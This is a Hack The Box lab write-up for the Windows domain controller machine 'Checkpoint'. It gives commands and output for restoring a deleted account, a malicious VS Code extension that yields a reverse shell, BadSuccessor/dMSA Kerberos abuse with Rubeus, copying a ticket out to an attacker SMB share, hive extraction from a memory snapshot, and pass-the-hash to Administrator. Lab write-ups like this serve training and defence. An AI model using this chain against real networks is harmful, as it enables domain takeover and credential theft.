---
slug: "hackthebox/machines/htb-checkpoint"
event: "hack-the-box-machines"
title: "HTB Checkpoint Writeup"
summary: "Active Directory writeup covering ACL abuse, VSIX deployment, BadSuccessor/dMSA abuse, and memory forensics."
date: 2026-06-15
tags:
  - htb
  - windows
  - active-directory
  - kerberos
  - memory-forensics
  - recon
category: "hack-the-box"
difficulty: "medium"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d90d9ba3228fb458485c03a1b4c2f6e5.png"
draft: false
---
# Hack The Box — Checkpoint Writeup

> Screenshot omitted for privacy review.
## Machine Overview

| Item              | Details                                             |
| ----------------- | --------------------------------------------------- |
| Machine           | Checkpoint                                          |
| Platform          | Hack The Box                                        |
| Target IP         | `[REDACTED_TARGET_IP]`                                     |
| Domain            | `checkpoint.htb`                                    |
| Domain Controller | `DC01.checkpoint.htb`                               |
| OS                | Windows Server / Windows 11 Server 2025 Build 26100 |
| Difficulty        | Medium                                              |
| Final User Flag   | `[REDACTED_FLAG]`                  |
| Final Root Flag   | `[REDACTED_FLAG]`                  |

Checkpoint was an Active Directory machine focused on ACL abuse, deleted object recovery, unsafe VS Code extension automation, BadSuccessor/dMSA Kerberos abuse, and offline credential extraction from a VMware memory snapshot. The final path was: restore a deleted user, abuse a writable VSIX deployment share for code execution as Ryan, create a BadSuccessor dMSA ticket to access backups, extract the Administrator hash from memory-backed registry hives, and pass-the-hash to domain Administrator.

---

## Enumeration Recon

### Host Setup

The target was added to `/etc/hosts` for stable DNS resolution.

```bash
echo "[REDACTED_TARGET_IP] DC01.checkpoint.htb dc01.checkpoint.htb checkpoint.htb" | sudo tee -a /etc/hosts
```

Kerberos operations were sensitive to clock skew, so Kali was synchronized with the domain controller.

```bash
sudo ntpdate -u [REDACTED_TARGET_IP]
date
```

---

### Port Scanning

Initial Nmap scanning identified the host as a Windows domain controller.

```bash
sudo nmap -sC -sV -oA checkpoint_initial [REDACTED_TARGET_IP]
```

A full TCP scan was also performed.

```bash
sudo nmap -p- --min-rate 10000 -oA checkpoint_allports [REDACTED_TARGET_IP]
```

Typical exposed services for this target included:

```text
53/tcp    DNS
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password change
593/tcp   RPC over HTTP
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
5985/tcp  WinRM
```

Critical finding:

```text
The machine was an Active Directory domain controller for checkpoint.htb.
SMB, LDAP, Kerberos, and WinRM were exposed.
```

---

### SMB Enumeration

Initial valid credentials were available:

```text
alex.turner : [REDACTED_PASSWORD]
```

SMB shares were enumerated with NetExec.

```bash
nxc smb DC01.checkpoint.htb \
  -d checkpoint.htb \
  -u alex.turner \
  -p '[REDACTED_PASSWORD]' \
  --shares \
  --dns-server [REDACTED_TARGET_IP]
```

Important shares:

```text
DevDrop     READ
NETLOGON    READ
SYSVOL      READ
VMBackups   No access initially
```

The `DevDrop` share stood out because its description referenced VS Code extension packages:

```text
VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```

That strongly suggested a file-drop automation path.

---

### LDAP and ACL Enumeration

Active Directory permissions were checked using `bloodyAD`.

```bash
bloodyAD \
  --host DC01.checkpoint.htb \
  --dc-ip [REDACTED_TARGET_IP] \
  -d checkpoint.htb \
  -u alex.turner \
  -p '[REDACTED_PASSWORD]' \
  get writable
```

Critical ACL findings:

```text
alex.turner had write/reanimation rights over:
CN=Deleted Objects,DC=checkpoint,DC=htb

alex.turner had CREATE_CHILD over:
OU=Employees,DC=checkpoint,DC=htb
```

A deleted AD object was identified:

```text
CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
```

This was a key pivot. If `alex.turner` could restore deleted objects, then the deleted user could potentially regain access to useful resources.

---

## Initial Foothold

### Restoring the Deleted User

The deleted `mark.davies` object was restored with `bloodyAD`.

```bash
bloodyAD \
  --host DC01.checkpoint.htb \
  --dc-ip [REDACTED_TARGET_IP] \
  -d checkpoint.htb \
  -u alex.turner \
  -p '[REDACTED_PASSWORD]' \
  set restore "CN=Mark Davies\\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

The restored account reused the same password pattern:

```text
mark.davies : [REDACTED_PASSWORD]
```

Access was validated:

```bash
nxc smb DC01.checkpoint.htb \
  -d checkpoint.htb \
  -u mark.davies \
  -p '[REDACTED_PASSWORD]' \
  --shares \
  --dns-server [REDACTED_TARGET_IP]
```

`mark.davies` had write access to the `DevDrop` share.

---

### Analyzing DevDrop

The `DevDrop` share was intended for VS Code extension deployment. Since `.vsix` files are extension packages that can execute JavaScript during activation, this became the foothold path.

The logic was:

```text
Writable DevDrop share
→ automated VS Code extension sync
→ upload malicious .vsix
→ extension installed by scheduled automation
→ code execution as the automation user
```

The automation later appeared to be linked to a VS Code extension sync process that installed packages from:

```text
C:\Shares\DevDrop
```

The execution context was:

```text
checkpoint\ryan.brooks
```

---

### Malicious VSIX Upload

A malicious VS Code extension package was prepared locally and uploaded to the share.

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/Checkpoint/vsixext/checkpoint-helper

smbclient //DC01.checkpoint.htb/DevDrop \
  -U 'checkpoint.htb/mark.davies%[REDACTED_PASSWORD]' \
  -c 'put checkpoint-helper-1.0.0.vsix; ls'
```

A listener was started on Kali:

```bash
nc -lvnp 4444
```

When the scheduled sync process installed and activated the extension, a shell was received as Ryan.

```text
connect to [REDACTED_VPN_IP] from [REDACTED_TARGET_IP]
whoami
checkpoint\ryan.brooks
```

This worked because VS Code extensions can execute code when activated, and the deployment workflow trusted files uploaded to a writable SMB share.

---

## Privilege Escalation

## Ryan to Service Account Abuse

### Finding Ryan’s AD Rights

Further AD enumeration showed that `ryan.brooks` had `GenericWrite` over the service account:

```text
svc_deploy
```

The service account was interesting because it belonged to backup-related and remote management groups:

```text
CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
```

The `BackupAccess` membership implied that `svc_deploy` could read the restricted `VMBackups` share.

However, Ryan could not directly extract `svc_deploy`’s password. The correct path was Kerberos-based abuse through BadSuccessor/dMSA.

---

## BadSuccessor / dMSA Abuse

### Creating the dMSA Object

Using `alex.turner`’s rights over the `Employees` OU, a delegated managed service account was created and configured to supersede `svc_deploy`.

```bash
bloodyAD \
  --host DC01.checkpoint.htb \
  --dc-ip [REDACTED_TARGET_IP] \
  -d checkpoint.htb \
  -u alex.turner \
  -p '[REDACTED_PASSWORD]' \
  add badSuccessor \
  --prepatch \
  --ou "OU=Employees,DC=checkpoint,DC=htb" \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  svcbackup
```

The command returned an error while trying to retrieve a TGT:

```text
[-] Failed to retrieve dMSA TGT
KDC_ERR_ETYPE_NOTSUPP
```

The error did not prevent the important AD object changes from being created.

The BadSuccessor link was verified:

```bash
bloodyAD \
  --host DC01.checkpoint.htb \
  --dc-ip [REDACTED_TARGET_IP] \
  -d checkpoint.htb \
  -u alex.turner \
  -p '[REDACTED_PASSWORD]' \
  get object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --attr msDS-SupersededManagedAccountLink,msDS-SupersededServiceAccountState \
  --raw
```

Expected output:

```text
msDS-SupersededManagedAccountLink: CN=svcbackup,OU=Employees,DC=checkpoint,DC=htb
msDS-SupersededServiceAccountState: 2
```

The same relationship could also be enforced from Ryan’s shell using LDAP writes:

```powershell
$ErrorActionPreference = "Stop"

$dmsaDN = "CN=svcbackup,OU=Employees,DC=checkpoint,DC=htb"
$targetDN = "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"

$target = New-Object DirectoryServices.DirectoryEntry("LDAP://$targetDN")
$target.PutEx(2, "msDS-SupersededManagedAccountLink", @($dmsaDN))
$target.PutEx(2, "msDS-SupersededServiceAccountState", @(2))
$target.CommitChanges()

"done"
```

Why this worked:

```text
Ryan had write control over svc_deploy.
The dMSA object svcbackup$ was configured to supersede svc_deploy.
Kerberos could then issue a ticket for svcbackup$ with access equivalent to the superseded service account path.
```

---

## Kerberos Ticket Generation with Rubeus

`Rubeus.exe` was uploaded to Ryan’s documents directory:

```text
C:\Users\ryan.brooks\Documents\Rubeus.exe
```

The AES key for `alex.turner` was generated:

```powershell
cd C:\Users\ryan.brooks\Documents

cmd /c ".\Rubeus.exe hash /password:[REDACTED_PASSWORD] /user:alex.turner /domain:checkpoint.htb > alex_hashes.txt 2>&1"

type alex_hashes.txt
```

Important value:

```text
aes256_cts_hmac_sha1 : [REDACTED_HASH]
```

A TGT for `alex.turner` was requested:

```powershell
cmd /c ".\Rubeus.exe asktgt /user:alex.turner /aes256:[REDACTED_HASH] /domain:checkpoint.htb /dc:[REDACTED_TARGET_IP] /outfile:alex.kirbi /nowrap > alex_tgt.txt 2>&1"

type alex_tgt.txt
dir alex.kirbi
```

Then a dMSA ticket was requested for `svcbackup$`:

```powershell
cd C:\Users\ryan.brooks\Documents

klist purge

cmd /c ".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/checkpoint.htb /targetuser:svcbackup$ /ticket:alex.kirbi /dc:[REDACTED_TARGET_IP] /outfile:svcbackup_dmsa.kirbi /ptt /nowrap > dmsa_tgs.txt 2>&1"

type dmsa_tgs.txt
klist
```

Successful result:

```text
TGS request successful
Ticket successfully imported
Client: svcbackup$
Server: krbtgt/CHECKPOINT.HTB
Ticket written to svcbackup_dmsa.kirbi
```

The ticket was transferred back to Kali.

On Kali, an authenticated SMB server was started:

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/Checkpoint

sudo fuser -k 445/tcp 2>/dev/null
sudo impacket-smbserver loot "$PWD/loot" -smb2support -username transfer -password '[REDACTED_CREDENTIAL]'
```

On the target:

```powershell
cd C:\Users\ryan.brooks\Documents

cmd /c "net use * /delete /y"
cmd /c "net use \\[REDACTED_VPN_IP]\loot /user:transfer [REDACTED_CREDENTIAL]"
cmd /c "copy /Y C:\Users\ryan.brooks\Documents\svcbackup_dmsa.kirbi \\[REDACTED_VPN_IP]\loot\svcbackup_dmsa.kirbi"
```

On Kali, the ticket was converted to ccache:

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/Checkpoint

impacket-ticketConverter loot/svcbackup_dmsa.kirbi svcbackup_dmsa.ccache
export KRB5CCNAME="$PWD/svcbackup_dmsa.ccache"

klist
```

A key detail: generating a normal TGT for `svcbackup$` using only the AES key did not preserve the BadSuccessor context. The Rubeus dMSA-generated ticket was required.

---

## Accessing VMBackups

With the dMSA Kerberos cache loaded, `VMBackups` became readable.

```bash
nxc smb DC01.checkpoint.htb \
  -k --use-kcache \
  --shares \
  --dns-server [REDACTED_TARGET_IP]
```

Critical result:

```text
checkpoint.htb\svcbackup$ from ccache
VMBackups READ
```

Share listing:

```bash
nxc smb DC01.checkpoint.htb \
  -k --use-kcache \
  --share VMBackups \
  --dir . \
  --dns-server [REDACTED_TARGET_IP]
```

Output:

```text
NightlyBackup_2024-11-01
```

Deeper enumeration:

```bash
nxc smb DC01.checkpoint.htb \
  -k --use-kcache \
  --share VMBackups \
  --dir 'NightlyBackup_2024-11-01\memory forensics' \
  --dns-server [REDACTED_TARGET_IP]
```

Files discovered:

```text
Windows Server 2019-000001.vmdk          106,496,000 bytes
Windows Server 2019-Snapshot1.vmem       2,147,483,648 bytes
Windows Server 2019-Snapshot1.vmsn       138,164,859 bytes
Windows Server 2019.nvram                270,840 bytes
Windows Server 2019.scoreboard           7,642 bytes
Windows Server 2019.vmdk                 10,199,695,360 bytes
Windows Server 2019.vmsd                 502 bytes
Windows Server 2019.vmx                  2,749 bytes
Windows Server 2019.vmxf                 274 bytes
```

The `.vmem` file was selected because it contained volatile memory and was much smaller than the full VMDK.

---

## Downloading the VMware Memory Snapshot

The dMSA Kerberos ticket expired quickly, so the direct download failed mid-transfer.

Example failure:

```text
STATUS_NETWORK_SESSION_EXPIRED
The client session has expired; so the client must re-authenticate.
```

A resumable SMB downloader was used to continue from the existing partial file.

```python
#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE
import os
import sys

TARGET = "DC01.checkpoint.htb"
DC_IP = "[REDACTED_TARGET_IP]"
DOMAIN = "checkpoint.htb"
SHARE = "VMBackups"

REMOTE = r"NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
LOCAL = "VMBackups_loot/Windows_Server_2019-Snapshot1.vmem"

TOTAL = 2147483648
CHUNK = 4 * 1024 * 1024

os.makedirs(os.path.dirname(LOCAL), exist_ok=True)

offset = os.path.getsize(LOCAL) if os.path.exists(LOCAL) else 0
print(f"[+] Local size: {offset}/{TOTAL}")

conn = SMBConnection(TARGET, TARGET, sess_port=445)

conn.kerberosLogin(
    user="svcbackup$",
    password="",
    domain=DOMAIN,
    lmhash="",
    nthash="",
    aesKey="",
    kdcHost=DC_IP,
    useCache=True
)

tid = conn.connectTree(SHARE)

fid = conn.openFile(
    tid,
    REMOTE,
    desiredAccess=FILE_READ_DATA,
    shareMode=FILE_SHARE_READ,
    creationOption=FILE_NON_DIRECTORY_FILE,
    creationDisposition=FILE_OPEN
)

with open(LOCAL, "ab") as f:
    while offset < TOTAL:
        try:
            data = conn.readFile(tid, fid, offset, CHUNK)

            if not data:
                print("\n[!] No more data returned")
                break

            f.write(data)
            f.flush()

            offset += len(data)
            pct = (offset / TOTAL) * 100
            print(f"[+] {offset}/{TOTAL} bytes ({pct:.2f}%)", end="\r")

        except Exception as e:
            print(f"\n[-] Download stopped at offset {offset}")
            print(f"[-] Error: {e}")
            print("[*] Regenerate fresh BadSuccessor ticket, convert, export KRB5CCNAME, then rerun.")
            sys.exit(1)

conn.closeFile(tid, fid)

print(f"\n[+] Done: {LOCAL}")
```

The file was confirmed complete:

```bash
stat -c '%n %s bytes' VMBackups_loot/Windows_Server_2019-Snapshot1.vmem
ls -lh VMBackups_loot/Windows_Server_2019-Snapshot1.vmem
```

Output:

```text
VMBackups_loot/Windows_Server_2019-Snapshot1.vmem 2147483648 bytes
-rw-rw-r-- 1 kali kali 2.0G VMBackups_loot/Windows_Server_2019-Snapshot1.vmem
```

---

## Memory Forensics with Volatility 3

Volatility 3 was installed in a virtual environment:

```bash
python3 -m venv ~/vol3-venv
source ~/vol3-venv/bin/activate
pip install volatility3
```

Memory image information:

```bash
vol -f VMBackups_loot/Windows_Server_2019-Snapshot1.vmem windows.info
```

Relevant output:

```text
NtProductType   NtProductServer
Major/Minor     15.17763
NtMajorVersion  10
NtMinorVersion  0
Is64Bit         True
SystemTime      2026-05-09 14:08:58+00:00
NtSystemRoot    C:\Windows
```

Process listing:

```bash
vol -f VMBackups_loot/Windows_Server_2019-Snapshot1.vmem windows.pslist \
  | tee VMBackups_loot/pslist.txt

grep -i lsass VMBackups_loot/pslist.txt
```

LSASS was identified:

```text
596     452     lsass.exe
```

Command-line enumeration:

```bash
vol -f VMBackups_loot/Windows_Server_2019-Snapshot1.vmem windows.cmdline \
  | tee VMBackups_loot/cmdline.txt
```

The Volatility 3 build did not include `windows.hashdump`, `windows.cachedump`, or `windows.lsadump`, so registry hives were dumped manually.

---

## Dumping Registry Hives from Memory

Registry hive listing:

```bash
mkdir -p VMBackups_loot/hives

vol -f VMBackups_loot/Windows_Server_2019-Snapshot1.vmem \
  windows.registry.hivelist \
  | tee VMBackups_loot/hivelist.txt
```

Important hives:

```text
\REGISTRY\MACHINE\SYSTEM
\SystemRoot\System32\Config\SAM
\SystemRoot\System32\Config\SECURITY
\SystemRoot\System32\Config\SOFTWARE
\??\C:\Users\Administrator\ntuser.dat
```

Hive dump:

```bash
vol -f VMBackups_loot/Windows_Server_2019-Snapshot1.vmem \
  -o VMBackups_loot/hives \
  windows.registry.hivelist \
  --dump
```

Relevant dumped files:

```text
registry.SYSTEM.0xc30a2fe38000.hive
registry.SAM.0xc30a3278e000.hive
registry.SECURITY.0xc30a32789000.hive
registry.SOFTWARE.0xc30a3205b000.hive
registry.ntuserdat.0xc30a37244000.hive
```

---

## Extracting Administrator Hash

`secretsdump` was used against the offline hives.

The Volatility virtual environment did not have Impacket, so it was deactivated first.

```bash
deactivate
```

Then:

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/Checkpoint

impacket-secretsdump \
  -sam VMBackups_loot/hives/registry.SAM.0xc30a3278e000.hive \
  -system VMBackups_loot/hives/registry.SYSTEM.0xc30a2fe38000.hive \
  -security VMBackups_loot/hives/registry.SECURITY.0xc30a32789000.hive \
  LOCAL \
  | tee VMBackups_loot/secretsdump_local.txt
```

Output:

```text
[*] Target system bootKey: 0x[REDACTED_HASH]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:[REDACTED_HASH]:[REDACTED_HASH]:::
Guest:501:[REDACTED_HASH]:[REDACTED_HASH]:::
DefaultAccount:503:[REDACTED_HASH]:[REDACTED_HASH]:::
WDAGUtilityAccount:504:[REDACTED_HASH]:[REDACTED_HASH]:::
```

Extracted hash:

```text
Administrator NTLM: [REDACTED_HASH]
```

---

## Administrator Access

The Administrator hash was tested against SMB.

```bash
nxc smb DC01.checkpoint.htb \
  -d checkpoint.htb \
  -u Administrator \
  -H [REDACTED_HASH] \
  --shares \
  --dns-server [REDACTED_TARGET_IP]
```

Successful output:

```text
[+] checkpoint.htb\Administrator:[REDACTED_HASH] (Pwn3d!)

ADMIN$          READ,WRITE
C$              READ,WRITE
NETLOGON        READ,WRITE
SYSVOL          READ,WRITE
```

WinRM validation:

```bash
nxc winrm DC01.checkpoint.htb \
  -d checkpoint.htb \
  -u Administrator \
  -H [REDACTED_HASH] \
  --dns-server [REDACTED_TARGET_IP]
```

Output:

```text
[+] checkpoint.htb\Administrator:[REDACTED_HASH] (Pwn3d!)
```

Before Evil-WinRM, the Kerberos cache was unset to avoid it trying to use an old ticket.

```bash
unset KRB5CCNAME
```

Shell:

```bash
evil-winrm -i DC01.checkpoint.htb \
  -u Administrator \
  -H [REDACTED_HASH]
```

Validation:

```powershell
whoami
hostname
```

Output:

```text
checkpoint\administrator
DC01
```

---

## Root Flag

The root flag was not in the default Administrator desktop path, so it was searched recursively.

```powershell
cd C:\Users
dir -Recurse -Force -Filter [REDACTED_FLAG_PATH] -ErrorAction SilentlyContinue
```

Result:

```text
Directory: C:\Users\max.palmer\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/15/2026   6:31 AM             34 [REDACTED_FLAG_PATH]
```

Read the flag:

```powershell
cd C:\Users\max.palmer\Desktop
type [REDACTED_FLAG_PATH]
```

Output:

```text
[REDACTED_HASH]
```

---

## User Flag

The user flag was located on Ryan’s desktop.

```powershell
cd C:\Users\ryan.brooks\Desktop
dir
```

Output:

```text
Directory: C:\Users\ryan.brooks\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/15/2026   6:31 AM             34 [REDACTED_FLAG_PATH]
```

Reading it as Administrator initially failed:

```powershell
type [REDACTED_FLAG_PATH]
```

Output:

```text
Access to the path 'C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH]' is denied.
```

The ACL showed restricted permissions:

```powershell
icacls C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH]
```

Output:

```text
C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH] CHECKPOINT\ryan.brooks:(R)
                                      CHECKPOINT\max.palmer:(F)
```

As Administrator, ownership was taken and full control was granted.

```powershell
takeown /F C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH]

icacls C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH] /grant checkpoint\Administrator:F

type C:\Users\ryan.brooks\Desktop\[REDACTED_FLAG_PATH]
```

Output:

```text
[REDACTED_HASH]
```

---

## Key Takeaways

- Deleted AD objects can become a privilege escalation path if low-privileged users have reanimation rights.

- Writable software deployment shares are high-risk, especially when they trigger automated installation or execution.

- VS Code `.vsix` packages can execute code when activated, making extension deployment pipelines sensitive attack surfaces.

- `GenericWrite` over service accounts can be dangerous even without direct password retrieval.

- BadSuccessor/dMSA abuse can produce Kerberos tickets that inherit useful access paths.

- A plain TGT generated from a dMSA key may not preserve the BadSuccessor context; the Rubeus dMSA ticket path was required.

- Backup shares containing `.vmem`, `.vmsn`, or VMDK files should be treated as credential material.

- Volatile memory snapshots can expose registry hives, LSASS memory, and credential material.

- Local Administrator password reuse allowed an offline hash from a backup VM to authenticate against the live domain controller.

- NTLM pass-the-hash remains highly effective when administrative hashes are reused.


---

## Final Attack Chain

```text
alex.turner credentials
→ Restore deleted mark.davies object
→ mark.davies writes malicious VSIX to DevDrop
→ VS Code sync executes payload as ryan.brooks
→ ryan.brooks has GenericWrite over svc_deploy
→ Abuse BadSuccessor with svcbackup$ dMSA
→ Generate dMSA Kerberos ticket using Rubeus
→ Access VMBackups share as svcbackup$
→ Download VMware .vmem memory snapshot
→ Analyze with Volatility 3
→ Dump SAM/SYSTEM/SECURITY hives
→ Extract Administrator NTLM hash with secretsdump
→ Pass-the-hash to DC01
→ WinRM as checkpoint\Administrator
→ Take ownership of protected user flag
→ Read root flag from max.palmer profile
```

Final credentials:

```text
checkpoint.htb\Administrator
NTLM: [REDACTED_HASH]
```

Flags:

```text
[REDACTED_FLAG_PATH]: [REDACTED_HASH]
[REDACTED_FLAG_PATH]: [REDACTED_HASH]
```
